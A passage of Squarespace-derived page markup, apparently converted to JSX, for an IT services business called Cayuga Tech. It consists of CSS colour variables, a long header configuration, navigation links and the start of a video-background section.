hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-background-color:hsla(var(--accent-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--accent-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--accent-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--accent-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--accent-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--accent-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-title-color:hsla(var(--accent-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-text-block-background-color:hsla(var(--accent-hsl),1);--tweak-video-item-description-color:hsla(var(--accent-hsl),1);--tweak-video-item-meta-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--accent-hsl),1);--tweak-video-item-title-color:hsla(var(--accent-hsl),1);--video-grid-basic-description-color:hsla(var(--accent-hsl),1);--video-grid-basic-meta-color:hsla(var(--accent-hsl),1);--video-grid-basic-title-color:hsla(var(--accent-hsl),1);--video-grid-category-nav-color:hsla(var(--accent-hsl),1);}\n      " }} />
        <style id="rteTextColorMapping" dangerouslySetInnerHTML={{__html: ".sqsrte-text-color--white{color:hsla(var(--white-hsl),1);}.sqsrte-text-color--black{color:hsla(var(--black-hsl),1);}.sqsrte-text-color--safeLightAccent{color:hsla(var(--safeLightAccent-hsl),1);}.sqsrte-text-color--safeDarkAccent{color:hsla(var(--safeDarkAccent-hsl),1);}.sqsrte-text-color--safeInverseAccent{color:hsla(var(--safeInverseAccent-hsl),1);}.sqsrte-text-color--safeInverseLightAccent{color:hsla(var(--safeInverseLightAccent-hsl),1);}.sqsrte-text-color--safeInverseDarkAccent{color:hsla(var(--safeInverseDarkAccent-hsl),1);}.sqsrte-text-color--accent{color:hsla(var(--accent-hsl),1);}.sqsrte-text-color--lightAccent{color:hsla(var(--lightAccent-hsl),1);}.sqsrte-text-color--darkAccent{color:hsla(var(--darkAccent-hsl),1);}\n    " }} />
        <link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/versioned-assets/1704389064263-ZEVAGRYG1ZUZTY6MY87B/static.css" />
        <div id="siteWrapper" className="clearfix site-wrapper">
          <div id="floatingCart" className="floating-cart hidden">
            <a href="cart.php" className="icon icon--stroke icon--fill icon--cart sqs-custom-cart">
              <span className="Cart-inner">
                <svg className="icon icon--cart" viewBox="0 0 31 24">
                  <g className="svg-icon cart-icon--odd">
                    <circle fill="none" strokeMiterlimit={10} cx="22.5" cy="21.5" r={1} />
                    <circle fill="none" strokeMiterlimit={10} cx="9.5" cy="21.5" r={1} />
                    <path fill="none" strokeMiterlimit={10} d="M0,1.5h5c0.6,0,1.1,0.4,1.1,1l1.7,13
      c0.1,0.5,0.6,1,1.1,1h15c0.5,0,1.2-0.4,1.4-0.9l3.3-8.1c0.2-0.5-0.1-0.9-0.6-0.9H12" />
                  </g>
                </svg>
                <div className="legacy-cart icon-cart-quantity">
                  <span className="sqs-cart-quantity">0</span>
                </div>
              </span>
            </a>
          </div>
          <header data-test="header" id="header" className="
    
      
    
    header theme-col--primary
  " data-controller="Header" data-current-styles="{
&quot;layout&quot;: &quot;navRight&quot;,
&quot;action&quot;: {
&quot;href&quot;: &quot;/contact&quot;,
&quot;buttonText&quot;: &quot;Get Started&quot;,
&quot;newWindow&quot;: false
},
&quot;showSocial&quot;: false,
&quot;socialOptions&quot;: {
&quot;socialBorderShape&quot;: &quot;none&quot;,
&quot;socialBorderStyle&quot;: &quot;outline&quot;,
&quot;socialBorderThickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 1.0
}
},
&quot;sectionTheme&quot;: &quot;&quot;,
&quot;menuOverlayTheme&quot;: &quot;light-bold&quot;,
&quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
&quot;cartStyle&quot;: &quot;cart&quot;,
&quot;cartText&quot;: &quot;Cart&quot;,
&quot;showEmptyCartState&quot;: true,
&quot;cartOptions&quot;: {
&quot;iconType&quot;: &quot;stroke-1&quot;,
&quot;cartBorderShape&quot;: &quot;none&quot;,
&quot;cartBorderStyle&quot;: &quot;outline&quot;,
&quot;cartBorderThickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 1.0
}
},
&quot;showButton&quot;: true,
&quot;showCart&quot;: false,
&quot;showAccountLogin&quot;: false,
&quot;headerStyle&quot;: &quot;solid&quot;,
&quot;languagePicker&quot;: {
&quot;enabled&quot;: false,
&quot;iconEnabled&quot;: false,
&quot;iconType&quot;: &quot;globe&quot;,
&quot;flagShape&quot;: &quot;shiny&quot;,
&quot;languageFlags&quot;: [ ]
},
&quot;mobileOptions&quot;: {
&quot;layout&quot;: &quot;logoLeftNavRight&quot;,
&quot;menuIcon&quot;: &quot;halfLineHamburger&quot;,
&quot;menuIconOptions&quot;: {
&quot;style&quot;: &quot;tripleLineHamburger&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 1.0
}
}
},
&quot;dynamicOptions&quot;: {
&quot;border&quot;: {
&quot;enabled&quot;: false,
&quot;position&quot;: &quot;allSides&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 4.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
}
},
&quot;solidOptions&quot;: {
&quot;headerOpacity&quot;: {
&quot;unit&quot;: &quot;%&quot;,
&quot;value&quot;: 100.0
},
&quot;border&quot;: {
&quot;enabled&quot;: false,
&quot;position&quot;: &quot;allSides&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 4.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;dropShadow&quot;: {
&quot;enabled&quot;: false,
&quot;blur&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 30.0
},
&quot;spread&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;distance&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;blurBackground&quot;: {
&quot;enabled&quot;: false,
&quot;blurRadius&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 12.0
}
},
&quot;backgroundColor&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;white&quot;,
&quot;alphaModifier&quot;: 1.0
}
},
&quot;navigationColor&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;gradientOptions&quot;: {
&quot;gradientType&quot;: &quot;faded&quot;,
&quot;headerOpacity&quot;: {
&quot;unit&quot;: &quot;%&quot;,
&quot;value&quot;: 90.0
},
&quot;border&quot;: {
&quot;enabled&quot;: false,
&quot;position&quot;: &quot;allSides&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 4.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;dropShadow&quot;: {
&quot;enabled&quot;: false,
&quot;blur&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 30.0
},
&quot;spread&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;distance&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;blurBackground&quot;: {
&quot;enabled&quot;: false,
&quot;blurRadius&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 12.0
}
},
&quot;backgroundColor&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;white&quot;,
&quot;alphaModifier&quot;: 1.0
}
},
&quot;navigationColor&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;dropShadowOptions&quot;: {
&quot;enabled&quot;: false,
&quot;blur&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 30.0
},
&quot;spread&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;distance&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;borderOptions&quot;: {
&quot;enabled&quot;: false,
&quot;position&quot;: &quot;allSides&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 4.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;showPromotedElement&quot;: false,
&quot;buttonVariant&quot;: &quot;primary&quot;,
&quot;blurBackground&quot;: {
&quot;enabled&quot;: false,
&quot;blurRadius&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 12.0
}
},
&quot;headerOpacity&quot;: {
&quot;unit&quot;: &quot;%&quot;,
&quot;value&quot;: 100.0
}
}" data-section-id="header" data-header-theme data-menu-overlay-theme="light-bold" data-header-style="solid" data-language-picker="{
&quot;enabled&quot;: false,
&quot;iconEnabled&quot;: false,
&quot;iconType&quot;: &quot;globe&quot;,
&quot;flagShape&quot;: &quot;shiny&quot;,
&quot;languageFlags&quot;: [ ]
}" data-first-focusable-element tabIndex={-1} style={{-headerdropshadowcolor: 'hsla(var(--black-hsl), 1)', -headerbordercolor: 'hsla(var(--black-hsl), 1)', -solidheaderbackgroundcolor: 'hsla(var(--white-hsl), 1)', -solidheadernavigationcolor: 'hsla(var(--black-hsl), 1)', -gradientheaderbackgroundcolor: 'hsla(var(--white-hsl), 1)', -gradientheadernavigationcolor: 'hsla(var(--black-hsl), 1)'}}>
            <div className="sqs-announcement-bar-dropzone" />
            <div className="header-announcement-bar-wrapper"> 
              <a href="#page" tabIndex={1} className="header-skip-link sqs-button-element--primary">
                Skip to Content
              </a>
              <style dangerouslySetInnerHTML={{__html: "@supports (-webkit-backdrop-filter: none) or (backdrop-filter: none) {\n        .header-blur-background {\n            \n                -webkit-backdrop-filter: blur(12px);\n                backdrop-filter: blur(12px);\n            \n            \n        }\n    }\n" }} />
              <div className="header-border" data-header-style="solid" data-header-usability-enabled="true" data-header-border="false" data-test="header-border" style={{borderWidth: '0px !important'}} />
              <div className="header-dropshadow" data-header-style="solid" data-header-usability-enabled="true" data-header-dropshadow="false" data-test="header-dropshadow" style={{}} />
              <div>
                <div className="header-background-solid" data-header-style="solid" data-test="header-background-solid" style={{opacity: 'calc(100 * .01)'}} />
              </div>
              <div className="header-inner container--fluid
      
      
      
       header-mobile-layout-logo-left-nav-right
      
      
      
      
      
      
       header-layout-nav-right
      
      
      
      
      
      
      
      
      " style={{padding: 0}} data-test="header-inner">
                {/* Background */}
                <div className="header-background theme-bg--primary" />
                <div className="header-display-desktop" data-content-field="site-title">
                  {/* Social */}
                  {/* Title and nav wrapper */}
                  <div className="header-title-nav-wrapper">
                    {/* Title */}
                    <div className="
                    header-title
                    
                  " data-animation-role="header-element">
                      <div className="header-title-logo">
                        <a href="index.php" data-animation-role="header-element">
                          <img src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/1360639f-e600-40fa-83ca-a8a675955087/BoBoCayuga-Tech-logo-horizontal.png?format=1500w" alt="cayugatech" style={{display: 'block'}} fetchpriority="high" loading="eager" decoding="async" data-loader="raw" />
                        </a>
                      </div>
                    </div>
                    {/* Nav */}
                    <div className="header-nav">
                      <div className="header-nav-wrapper">
                        <nav className="header-nav-list">
                          <div className="header-nav-item header-nav-item--collection">
                            <a href="about.php" data-animation-role="header-element">
                              About
                            </a>
                          </div>
                          <div className="header-nav-item header-nav-item--collection">
                            <a href="services.php" data-animation-role="header-element">
                              Services
                            </a>
                          </div>
                          <div className="header-nav-item header-nav-item--collection">
                            <a href="core-values.php" data-animation-role="header-element">
                              Core Values
                            </a>
                          </div>
                        </nav>
                      </div>
                    </div>
                  </div>
                  {/* Actions */}
                  <div className="header-actions header-actions--right">
                    <div className="showOnMobile">
                    </div>
                    <div className="showOnDesktop">
                    </div>
                    <div className="header-actions-action header-actions-action--cta" data-animation-role="header-element">
                      <a className="btn btn--border theme-btn--primary-inverse sqs-button-element--primary" href="contact.php">
                        Get Started
                      </a>
                    </div>
                  </div>
                  <style dangerouslySetInnerHTML={{__html: ".top-bun, \n  .patty, \n  .bottom-bun {\n    height: 1px;\n  }\n" }} />
                  {/* Burger */}
                  <div className="header-burger

  menu-overlay-has-visible-non-navigation-items


  
" data-animation-role="header-element">
                    <button className="header-burger-btn burger" data-test="header-burger">
                      <span hidden className="js-header-burger-open-title visually-hidden">Open Menu</span>
                      <span hidden className="js-header-burger-close-title visually-hidden">Close Menu</span>
                      <div className="burger-box">
                        <div className="burger-inner header-menu-icon-tripleLineHamburger">
                          <div className="top-bun" />
                          <div className="patty" />
                          <div className="bottom-bun" />
                        </div>
                      </div>
                    </button>
                  </div>
                </div>
                <div className="header-display-mobile" data-content-field="site-title">
                  {/* Social */}
                  {/* Title and nav wrapper */}
                  <div className="header-title-nav-wrapper">
                    {/* Title */}
                    <div className="
                    header-title
                    
                  " data-animation-role="header-element">
                      <div className="header-title-logo">
                        <a href="index.php" data-animation-role="header-element">
                          <img src="https://images.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/1360639f-e600-40fa-83ca-a8a675955087/BoBoCayuga-Tech-logo-horizontal.png?format=1500w" alt="cayugatech" style={{display: 'block'}} fetchpriority="high" loading="eager" decoding="async" data-loader="raw" />
                        </a>
                      </div>
                    </div>
                    {/* Nav */}
                    <div className="header-nav">
                      <div className="header-nav-wrapper">
                        <nav className="header-nav-list">
                          <div className="header-nav-item header-nav-item--collection">
                            <a href="about.php" data-animation-role="header-element">
                              About
                            </a>
                          </div>
                          <div className="header-nav-item header-nav-item--collection">
                            <a href="services.php" data-animation-role="header-element">
                              Services
                            </a>
                          </div>
                          <div className="header-nav-item header-nav-item--collection">
                            <a href="core-values.php" data-animation-role="header-element">
                              Core Values
                            </a>
                          </div>
                        </nav>
                      </div>
                    </div>
                  </div>
                  {/* Actions */}
                  <div className="header-actions header-actions--right">
                    <div className="showOnMobile">
                    </div>
                    <div className="showOnDesktop">
                    </div>
                    <div className="header-actions-action header-actions-action--cta" data-animation-role="header-element">
                      <a className="btn btn--border theme-btn--primary-inverse sqs-button-element--primary" href="contact.php">
                        Get Started
                      </a>
                    </div>
                  </div>
                  <style dangerouslySetInnerHTML={{__html: ".top-bun, \n  .patty, \n  .bottom-bun {\n    height: 1px;\n  }\n" }} />
                  {/* Burger */}
                  <div className="header-burger

  menu-overlay-has-visible-non-navigation-items


  
" data-animation-role="header-element">
                    <button className="header-burger-btn burger" data-test="header-burger">
                      <span hidden className="js-header-burger-open-title visually-hidden">Open Menu</span>
                      <span hidden className="js-header-burger-close-title visually-hidden">Close Menu</span>
                      <div className="burger-box">
                        <div className="burger-inner header-menu-icon-tripleLineHamburger">
                          <div className="top-bun" />
                          <div className="patty" />
                          <div className="bottom-bun" />
                        </div>
                      </div>
                    </button>
                  </div>
                </div>
              </div>
            </div>
            {/* (Mobile) Menu Navigation */}
            <div className="header-menu header-menu--folder-list
    light-bold
    
    
    
    
    " data-current-styles="{
&quot;layout&quot;: &quot;navRight&quot;,
&quot;action&quot;: {
&quot;href&quot;: &quot;/contact&quot;,
&quot;buttonText&quot;: &quot;Get Started&quot;,
&quot;newWindow&quot;: false
},
&quot;showSocial&quot;: false,
&quot;socialOptions&quot;: {
&quot;socialBorderShape&quot;: &quot;none&quot;,
&quot;socialBorderStyle&quot;: &quot;outline&quot;,
&quot;socialBorderThickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 1.0
}
},
&quot;sectionTheme&quot;: &quot;&quot;,
&quot;menuOverlayTheme&quot;: &quot;light-bold&quot;,
&quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
&quot;cartStyle&quot;: &quot;cart&quot;,
&quot;cartText&quot;: &quot;Cart&quot;,
&quot;showEmptyCartState&quot;: true,
&quot;cartOptions&quot;: {
&quot;iconType&quot;: &quot;stroke-1&quot;,
&quot;cartBorderShape&quot;: &quot;none&quot;,
&quot;cartBorderStyle&quot;: &quot;outline&quot;,
&quot;cartBorderThickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 1.0
}
},
&quot;showButton&quot;: true,
&quot;showCart&quot;: false,
&quot;showAccountLogin&quot;: false,
&quot;headerStyle&quot;: &quot;solid&quot;,
&quot;languagePicker&quot;: {
&quot;enabled&quot;: false,
&quot;iconEnabled&quot;: false,
&quot;iconType&quot;: &quot;globe&quot;,
&quot;flagShape&quot;: &quot;shiny&quot;,
&quot;languageFlags&quot;: [ ]
},
&quot;mobileOptions&quot;: {
&quot;layout&quot;: &quot;logoLeftNavRight&quot;,
&quot;menuIcon&quot;: &quot;halfLineHamburger&quot;,
&quot;menuIconOptions&quot;: {
&quot;style&quot;: &quot;tripleLineHamburger&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 1.0
}
}
},
&quot;dynamicOptions&quot;: {
&quot;border&quot;: {
&quot;enabled&quot;: false,
&quot;position&quot;: &quot;allSides&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 4.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
}
},
&quot;solidOptions&quot;: {
&quot;headerOpacity&quot;: {
&quot;unit&quot;: &quot;%&quot;,
&quot;value&quot;: 100.0
},
&quot;border&quot;: {
&quot;enabled&quot;: false,
&quot;position&quot;: &quot;allSides&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 4.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;dropShadow&quot;: {
&quot;enabled&quot;: false,
&quot;blur&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 30.0
},
&quot;spread&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;distance&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;blurBackground&quot;: {
&quot;enabled&quot;: false,
&quot;blurRadius&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 12.0
}
},
&quot;backgroundColor&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;white&quot;,
&quot;alphaModifier&quot;: 1.0
}
},
&quot;navigationColor&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;gradientOptions&quot;: {
&quot;gradientType&quot;: &quot;faded&quot;,
&quot;headerOpacity&quot;: {
&quot;unit&quot;: &quot;%&quot;,
&quot;value&quot;: 90.0
},
&quot;border&quot;: {
&quot;enabled&quot;: false,
&quot;position&quot;: &quot;allSides&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 4.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;dropShadow&quot;: {
&quot;enabled&quot;: false,
&quot;blur&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 30.0
},
&quot;spread&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;distance&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;blurBackground&quot;: {
&quot;enabled&quot;: false,
&quot;blurRadius&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 12.0
}
},
&quot;backgroundColor&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;white&quot;,
&quot;alphaModifier&quot;: 1.0
}
},
&quot;navigationColor&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;dropShadowOptions&quot;: {
&quot;enabled&quot;: false,
&quot;blur&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 30.0
},
&quot;spread&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;distance&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 0.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;borderOptions&quot;: {
&quot;enabled&quot;: false,
&quot;position&quot;: &quot;allSides&quot;,
&quot;thickness&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 4.0
},
&quot;color&quot;: {
&quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
&quot;sitePaletteColor&quot;: {
&quot;colorName&quot;: &quot;black&quot;,
&quot;alphaModifier&quot;: 1.0
}
}
},
&quot;showPromotedElement&quot;: false,
&quot;buttonVariant&quot;: &quot;primary&quot;,
&quot;blurBackground&quot;: {
&quot;enabled&quot;: false,
&quot;blurRadius&quot;: {
&quot;unit&quot;: &quot;px&quot;,
&quot;value&quot;: 12.0
}
},
&quot;headerOpacity&quot;: {
&quot;unit&quot;: &quot;%&quot;,
&quot;value&quot;: 100.0
}
}" data-section-id="overlay-nav" data-show-account-login="false" data-test="header-menu">
              <div className="header-menu-bg theme-bg--primary" />
              <div className="header-menu-nav">
                <nav className="header-menu-nav-list">
                  <div data-folder="root" className="header-menu-nav-folder">
                    {/* Menu Navigation */}
                    <div className="header-menu-nav-folder-content">
                      <div className="header-menu-nav-wrapper">
                        <div className="container header-menu-nav-item header-menu-nav-item--collection">
                          <a href="about.php">
                            <div className="header-menu-nav-item-content">
                              About
                            </div>
                          </a>
                        </div>
                        <div className="container header-menu-nav-item header-menu-nav-item--collection">
                          <a href="services.php">
                            <div className="header-menu-nav-item-content">
                              Services
                            </div>
                          </a>
                        </div>
                        <div className="container header-menu-nav-item header-menu-nav-item--collection">
                          <a href="core-values.php">
                            <div className="header-menu-nav-item-content">
                              Core Values
                            </div>
                          </a>
                        </div>
                      </div>
                    </div>
                    <div className="header-menu-actions social-accounts" />
                    <div className="header-menu-cta">
                      <a className="theme-btn--primary btn sqs-button-element--primary" href="contact.php">
                        Get Started
                      </a>
                    </div>
                  </div>
                </nav>
              </div>
            </div>
          </header>
          <main id="page" className="container" role="main">
            <article className="sections" id="sections" data-page-sections="64ee27d3af3abd7bf1795407">
              <section data-test="page-section" data-section-theme="bright" className="page-section 
    
      user-items-list-section
      full-bleed-section
    
    
    
      
    
    
      
    
    
    
    
    
    bright" data-section-id="64ff72edf8a4d36581357db3" data-controller="SectionWrapperController" data-current-styles="{
&quot;imageFocalPoint&quot;: {
&quot;x&quot;: 0.5,
&quot;y&quot;: 0.5
},
&quot;imageOverlayOpacity&quot;: 0.3,
&quot;backgroundColor&quot;: &quot;white&quot;,
&quot;sectionTheme&quot;: &quot;bright&quot;,
&quot;imageEffect&quot;: &quot;none&quot;,
&quot;backgroundMode&quot;: &quot;video&quot;,
&quot;backgroundImage&quot;: null
}" data-current-context="{
&quot;video&quot;: {
&quot;filter&quot;: 6,
&quot;assetContentItemId&quot;: &quot;64ff73df7ae25642cca9d9b2&quot;,
&quot;filterStrength&quot;: 35,
&quot;videoFallbackContentItem&quot;: null,
&quot;nativeVideoContentItem&quot;: {
&quot;id&quot;: &quot;64ff73df7ae25642cca9d9b2&quot;,
&quot;recordType&quot;: 61,
&quot;addedOn&quot;: 1694462943042,
&quot;updatedOn&quot;: 1694462943042,
&quot;authorId&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;systemDataId&quot;: &quot;53984056-b42a-405a-bb84-bfe63a92d1a7&quot;,
&quot;systemDataVariants&quot;: &quot;1920:1080,640:360&quot;,
&quot;systemDataSourceType&quot;: &quot;mp4&quot;,
&quot;filename&quot;: &quot;GettyImages-1309665505.mov&quot;,
&quot;body&quot;: null,
&quot;likeCount&quot;: 0,
&quot;commentCount&quot;: 0,
&quot;publicCommentCount&quot;: 0,
&quot;commentState&quot;: 1,
&quot;author&quot;: {
&quot;id&quot;: &quot;604a5c8dc1c1ff6d55f28a3f&quot;,
&quot;displayName&quot;: &quot;Samantha Hickey&quot;,
&quot;firstName&quot;: &quot;Samantha&quot;,
&quot;lastName&quot;: &quot;Hickey&quot;,
&quot;avatarUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;,
&quot;websiteUrl&quot;: &quot;http://www.bluecoralcreative.com&quot;,
&quot;bio&quot;: &quot;&quot;,
&quot;avatarAssetUrl&quot;: &quot;https://static1.squarespace.com/static/images/606d0771be16cd2ee89b346b/300w&quot;
},
&quot;contentType&quot;: &quot;video/mp4&quot;,
&quot;structuredContent&quot;: {
&quot;_type&quot;: &quot;SqspHostedVideo&quot;,
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/53984056-b42a-405a-bb84-bfe63a92d1a7/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333
},
&quot;videoCodec&quot;: &quot;h264&quot;,
&quot;audioCodec&quot;: &quot;aac&quot;,
&quot;alexandriaUrl&quot;: &quot;https://video.squarespace-cdn.com/content/v1/64ee27cd6569ab5563a1b294/53984056-b42a-405a-bb84-bfe63a92d1a7/{variant}&quot;,
&quot;alexandriaLibraryId&quot;: &quot;64ee27cd6569ab5563a1b294&quot;,
&quot;aspectRatio&quot;: 1.7777777777777777,
&quot;durationSeconds&quot;: 20.033333,
&quot;items&quot;: [ ],
&quot;pushedServices&quot;: { },
&quot;pendingPushedServices&quot;: { },
&quot;usageId&quot;: &quot;04c452fc-65d0-3e13-af78-9aab741ddd5b&quot;,
&quot;recordTypeLabel&quot;: &quot;sqsp-hosted-video&quot;,
&quot;originalSize&quot;: &quot;1920:1080&quot;
},
